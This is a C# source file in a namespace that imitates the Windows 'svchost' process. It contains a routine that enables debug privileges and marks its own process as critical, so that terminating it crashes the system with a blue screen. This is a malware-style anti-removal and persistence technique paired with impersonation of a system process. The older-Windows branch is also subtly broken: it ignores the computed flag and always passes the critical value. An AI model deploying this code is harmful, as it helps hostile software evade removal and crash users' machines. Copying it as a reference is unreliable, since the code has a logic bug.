using svchost.Resilience.DllImports;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace svchost.Resilience
{
    public class CriticalProcess
    {
        /// <summary>
        /// Marks the process (defaults to current) as critical/non-critical (requires SeDebugPrivilege). If enabled and this process is killed, the machine will BSOD
        /// </summary>
        public static void MarkAs(bool critical)
        {
            IntPtr token = IntPtr.Zero;

            Process process = Process.GetCurrentProcess();

            try
            {
                //Requires admin, try get debug privileges, equivalent to RtlAdjustPrivilege
                //Process.EnterDebugMode(); //This is a shortcut, but full steps are below

                AdvApi32.LUID luid = new AdvApi32.LUID();

                if (AdvApi32.LookupPrivilegeValue(null, AdvApi32.SE_DEBUG_NAME, ref luid))
                {
                    AdvApi32.TOKEN_PRIVILEGE previous = new AdvApi32.TOKEN_PRIVILEGE();

                    AdvApi32.TOKEN_PRIVILEGE privilege = new AdvApi32.TOKEN_PRIVILEGE()
                    {
                        PrivilegeCount = 1,
                        Attributes = (uint)AdvApi32.SE_PRIVILEGE_ENABLED,
                        Luid = luid
                    };

                    if (AdvApi32.OpenProcessToken(process.Handle, (int)(AdvApi32.TokenAccessLevels.AdjustPrivileges | AdvApi32.TokenAccessLevels.Query), ref token))
                    {
                        uint length = 0;
                        if (AdvApi32.AdjustTokenPrivileges(token, false, ref privilege, 1024, ref previous, ref length))
                        {
                            int result = 0;

                            if (Environment.OSVersion.Version.Major >= 6 && Environment.OSVersion.Version.Minor >= 2)
                            {
                                bool old = false;

                                result = Ntdll.RtlSetProcessIsCritical(critical, out old, false);
                            }
                            else
                            {
                                int state = Ntdll.IS_NON_CRITICAL;

                                if (critical)
                                    state = Ntdll.IS_CRITICAL;

                                result = Ntdll.NtSetInformationProcess(process.Handle, (int)Ntdll.ProcessInformation.ProcessBreakOnTermination, ref Ntdll.IS_CRITICAL, sizeof(int));
                            }

                            if (result != 0)
                                throw new Win32Exception(Marshal.GetLastWin32Error());
                        }
                        else
                            throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                else
                    throw new Win32Exception(Marshal.GetLastWin32Error());

            }
            finally
            {
                if (token != IntPtr.Zero)
                    Kernel32.CloseHandle(token);

                //Process.LeaveDebugMode(); //This is a shortcut
            }
        }
    }
}
